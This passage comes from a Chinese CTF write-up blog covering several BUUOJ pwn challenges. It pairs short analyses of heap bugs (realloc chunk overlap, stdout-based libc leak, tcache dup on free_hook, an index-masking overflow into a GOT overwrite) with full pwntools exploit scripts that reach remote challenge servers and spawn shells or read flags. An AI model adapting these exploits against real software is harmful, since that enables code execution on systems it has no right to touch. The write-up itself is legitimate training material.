title="realloc的特点"></a>realloc的特点</h4><p>基础功能是改变<code>mem_address</code>所指内存区域的大小为newsize长度。这里就有几种不同的情况</p><ul><li>1.当size为0，这时就相当于free()函数，同时返回值为null</li><li>2.当指针为0，size大于0，相当于malloc函数</li><li>3.size小于等于原来的size，则在原先的基础上缩小，多余的堆块free掉</li><li>4.size大于原来的size，如果<strong>有足够空间</strong>就原基础扩充，空间不足则分配新的内存，并将原来指针指向的堆块旧内容复制到新的堆块内存中，然后再将原来的堆块free掉。</li></ul><p>其中第4点，有足够空间，画图解释一下：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uqru5B.png" srcset="/img/loading.gif" alt></p><p>由于这个特性，来制作3个堆块A、B、C，B堆块作为进入unsortbin的堆块存在，C是为了防止不让C合并top chunk，然后用A来申请一个size&lt;=（A的size + B的size）的堆块，这样就造成了堆块的重叠。</p><h4 id="利用-IO-2-1-stdout-来泄漏信息"><a href="#利用-IO-2-1-stdout-来泄漏信息" class="headerlink" title="利用 _IO_2_1_stdout_ 来泄漏信息"></a><code>利用 _IO_2_1_stdout_ 来泄漏信息</code></h4><p>参考链接：<br><a href="http://pzhxbz.cn/?p=139" target="_blank" rel="noopener">http://pzhxbz.cn/?p=139</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p>这个题因为有过输出，其<code>_IO_CURRENTLY_PUTTING</code>就是为1的 ，对于<code>_IO_IS_APPENDING</code>这个flag的值，将这个flag搞成1之后，就可以通过修改<code>_IO_buf_base</code>来完成leak。</p><p>在赛题中，很多程序都是用过输出函数进行输出的，基本就是改掉flag，中间的三个变量在输出的过程中都不怎么用得到，直接盖成0,低位覆盖<code>_IO_buf_base</code>为合适的值就可以完成leak。</p><p>Flag 怎么设置，在赛题中还是很随意的：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0xfbad1887</span><span class="hljs-number">0xfbad3c80</span></code></pre></div><p>重点就是让<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p><p>大体的利用方法就是利用unsorted bin的在tcache或fastbin的fd上留下<code>main_arena</code>的地址，由于<code>_IO_2_1_stdout_</code>与<code>arena</code>只相差4位，且低三位已知，在传入是低3位覆盖fd留下的<code>main_arena</code>的地址，剩余一位可以爆破，概率1/16,从而劫持stdout以达到泄露的目的 。</p><h2 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./roarctf_2019_realloc_magic'</span>elf = ELF(local_file)<span class="hljs-comment"># context.log_level = 'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28690</span>)    libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'?'</span>,str(size))    <span class="hljs-keyword">if</span> int(size) != <span class="hljs-number">0</span> :        sa(<span class="hljs-string">'?'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'aaaaaaa'</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'aaaaaaaa'</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">' '</span>)    add(<span class="hljs-number">0x110</span>,<span class="hljs-string">' '</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'a'</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):        free()    add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'\x60\x87'</span>)    payload = <span class="hljs-number">17</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">'\x60\x87'</span>    add(<span class="hljs-number">0x190</span>,payload)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'\x60\x87'</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    payload = p64(<span class="hljs-number">0xfbad3c80</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x100</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./roarctf_2019_realloc_magic')</span>        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28690</span>)        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">4110208</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">4118760</span> + libc_basesys_addr = <span class="hljs-number">324832</span>+libc_basesla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'666'</span>)add(<span class="hljs-number">0x120</span>,<span class="hljs-string">'aaaaaaa'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">' '</span>)add(<span class="hljs-number">0x160</span>,<span class="hljs-string">' '</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'a'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free()add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x120</span>,<span class="hljs-string">'\x60\x87'</span>)payload = <span class="hljs-number">37</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(free_hook)add(<span class="hljs-number">0x260</span>,payload)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'a'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)one_rec = rce18[<span class="hljs-number">1</span>] +libc_baseadd(<span class="hljs-number">0x130</span>,p64(one_rec))free()<span class="hljs-comment"># debug()</span>itr()</code></pre></div><p>其中exp的爆破stdout部分，可以当作模版使用，来自pzhxbz大佬的。</p><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a><code>ciscn_2019_en_3</code></h2><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>常规堆题，UAF，dup打<code>free_hook_</code>。上来用<code>puts(&amp;s)</code>，来泄漏栈上存在的libc地址。</p><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_en_3'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29542</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'story'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x20</span><span class="hljs-number">-8</span>)sa(<span class="hljs-string">'name'</span>,payload)sa(<span class="hljs-string">'ID'</span>,<span class="hljs-string">'chumen77'</span>)ru(<span class="hljs-string">'chumen77'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x81237</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)add(<span class="hljs-number">0x50</span>,<span class="hljs-string">'aaaaaaaa'</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span>add(<span class="hljs-number">0x50</span>,p64(free_hook))add(<span class="hljs-number">0x50</span>,p64(free_hook))rec = rce18[<span class="hljs-number">1</span>] + libc_baseadd(<span class="hljs-number">0x50</span>,p64(rec))free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="极客大挑战2019-Not-bad"><a href="#极客大挑战2019-Not-bad" class="headerlink" title="极客大挑战2019 Not bad"></a>极客大挑战2019 Not bad</h2><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>溢出0x18个字节，加上本身的栈长度，读orw 的shellcode内存不是很够用。需要迁移到mmap，进行orw。所以摆在栈上的shellcode就是，来一个read函数，把orw放在mmap上，然后再跳转上去执行即可。并且再次用到 <code>jmp rsp</code> + shellcode.</p><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bad'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29794</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()mmap = <span class="hljs-number">0x123000</span>jmp_rsp = <span class="hljs-number">0x0000000000400a01</span><span class="hljs-comment"># bss = 0x6010B0 - 0x20</span>orw = asm(shellcraft.open(<span class="hljs-string">"./flag"</span>))orw += asm(shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-string">"rsp"</span>,<span class="hljs-number">0x30</span>))orw += asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">"rsp"</span>,<span class="hljs-number">0x30</span>))payload = asm(shellcraft.read(<span class="hljs-number">0</span>,mmap + <span class="hljs-number">0x300</span>,<span class="hljs-number">0x100</span>)) + asm(<span class="hljs-string">'mov rax,0x123300;call rax'</span>)payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">'a'</span>)payload += p64(jmp_rsp) +   asm(<span class="hljs-string">'sub rsp,0x30;jmp rsp'</span>)sa(<span class="hljs-string">'fun'</span>,payload)s(orw)itr()</code></pre></div><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a><code>ciscn_2019_final_5</code></h2><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><p>保护开的不多，分析和利用起来简单不少。</p><p>这个题难点就是在于发现漏洞点。</p><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><div class="hljs"><pre><code class="hljs c">__int64 result; <span class="hljs-comment">// rax</span> <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span> <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span> <span class="hljs-keyword">int</span> idx; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span> <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"index: "</span>); idx = read_int(); <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">16</span> ) &#123;   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"index is invalid."</span>);   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); &#125; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"size: "</span>); size = read_int(); <span class="hljs-keyword">if</span> ( size &lt; <span class="hljs-number">0</span> || size &gt; <span class="hljs-number">0x1000</span> ) &#123;   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"size is invalid."</span>);   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); &#125; buf = <span class="hljs-built_in">malloc</span>(size); <span class="hljs-keyword">if</span> ( !buf ) &#123;   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"malloc error."</span>);   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); &#125; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"content: "</span>); read(<span class="hljs-number">0</span>, buf, size); show_diy((__int16)buf);</code></pre></div><p>可以自定义输入堆的编号，最大可以17个，就感觉有点奇怪。然后以栈上的一个buf来存取分配heap的地址。</p><div class="hljs"><pre><code class="hljs c">result = sub_400AB0((__int64)buf, idx);  v5 = result;  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">16</span>; ++i )  &#123;    result = heaplist_idx[i];    <span class="hljs-keyword">if</span> ( !result )    &#123;      heaplist_idx[i] = v5;      result = i;      sizelist[i] = size;      <span class="hljs-keyword">break</span>;    &#125;  &#125;</code></pre></div><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_400AB0</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2)</span></span>&#123;  <span class="hljs-keyword">return</span> a1 | a2;&#125;</code></pre></div><p>可以看到以堆地址与堆的id进行以来一个<code>|</code> 运算。然后返回回来给v5，然后在存入bss的一段地址中。算是处理过的堆地址。</p><p>尝试研究一下，做完处理是什么样子：</p><p>先分配一个堆号为1 和 16的堆块，看下bss里面是存入了什么。</p><div class="hljs"><pre><code class="hljs undefined">x/<span class="hljs-number">30</span>gx  <span class="hljs-number">0x6020E0</span><span class="hljs-number">0x6020e0</span>:       <span class="hljs-number">0x0000000000e35270</span>(<span class="hljs-number">16</span>)      <span class="hljs-number">0x0000000000e35281</span>(<span class="hljs-number">0</span>)</code></pre></div><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">2</span>]: hex(<span class="hljs-number">0x0e35260</span> | <span class="hljs-number">16</span>)Out[<span class="hljs-number">2</span>]: <span class="hljs-string">'0xe35270'</span>In [<span class="hljs-number">3</span>]: hex(<span class="hljs-number">0x00e35281</span> | <span class="hljs-number">0</span>)Out[<span class="hljs-number">3</span>]: <span class="hljs-string">'0xe35281'</span></code></pre></div><p>差不多就是这样，但是也可以发现点异样。因为是<code>|</code> 的逻辑运算，在<code>0-0xf</code>是一个轮回后，到了16就又算是一个轮回。<br>既然处理过堆地址，那肯定取出来进行操作时，肯定还会再进行处理回来。下面就是注意怎么处理的。</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">16</span>; ++i ) &#123;   result = get_idx(heaplist_idx[i]);   <span class="hljs-keyword">if</span> ( result == idx )   &#123;     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"content: "</span>);     read_diy((<span class="hljs-keyword">void</span> *)(heaplist_idx[i] &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL), sizelist[i]);     result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">"edit success.\n"</span>);     <span class="hljs-keyword">break</span>;   &#125; &#125;</code></pre></div><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">get_idx</span><span class="hljs-params">(<span class="hljs-keyword">char</span> a1)</span></span>&#123;  <span class="hljs-keyword">return</span> a1 &amp; <span class="hljs-number">0xF</span>;&#125;</code></pre></div><p>可以看到其是依次0-17编号对堆块进行遍历取出，再取出时会对其进行<code>&amp; 0xf</code>的操作来尝试获取堆块的编号。</p><p>来测试一下：</p><div class="hljs"><pre><code class="hljs c">In [5]: hex(0x00e35281 &amp; 0xf). #1号堆块的计算Out[5]: '0x1'In [6]: hex(0x00e35270 &amp; 0xf) #16号堆块的计算Out[6]: '0x0'</code></pre></div><p>这就很明显有异样了，申请的是16号堆块其认为是0号堆块。所以申请16号的堆块，其可以用edit（0）来进行编辑16号堆块。</p><p>然后看其如何编辑的：</p><div class="hljs"><pre><code class="hljs c">read_diy((<span class="hljs-keyword">void</span> *)(heaplist_idx[i] &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL), sizelist[i]);</code></pre></div><p>其是根据bss上存的处理过堆块地址进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code> 来进行编辑的。<br>对于上来就申请了一个16号的堆块，很容易知道其堆块的末3为应该是0x260，但是当时存入的是0x270，尝试进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code>：</p><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">7</span>]: hex(<span class="hljs-number">0x00e35270</span> &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>)Out[<span class="hljs-number">7</span>]: <span class="hljs-string">'0xe35270'</span></code></pre></div><p>发现并不是从0x260进行编辑，但是同样还是可以编辑同样的size，所以这就造成了溢出，并且是0x10个字节。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li>释放2个tcache 堆块，并且利用0x10字节，改其中一个堆块的fd，改为free的got位置</li><li>申请堆块到free got处，改free 为 puts</li><li>构造出一个unsortbin的堆块，然后再申请一个堆块，就会在这个堆块上留下部分的libc地址，然后进行leak</li><li>算出system的地址，继续改free got 处为 system，然后free一个带有<code>/bin/sh\x00</code>的堆块，即可拿到shell</li></ul><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_5'</span>elf = ELF(local_file)<span class="hljs-comment"># context.log_level = 'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27180</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'content'</span>,str(data))add(<span class="hljs-number">16</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'sasdasdas'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x121</span>) + p64(<span class="hljs-number">0x000000000602010</span>))add(<span class="hljs-number">5</span>,<span class="hljs-number">0x800</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">'aaaa'</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">' '</span>)free(<span class="hljs-number">5</span>)add(<span class="hljs-number">7</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">' '</span>)add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span> + p64(elf.plt[<span class="hljs-string">'puts'</span>]))free(<span class="hljs-number">7</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ec120</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)edit(<span class="hljs-number">4</span>,<span class="hljs-string">'aaaaaaaa'</span> + p64(libc.sym[<span class="hljs-string">'system'</span>] + libc_base))add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span 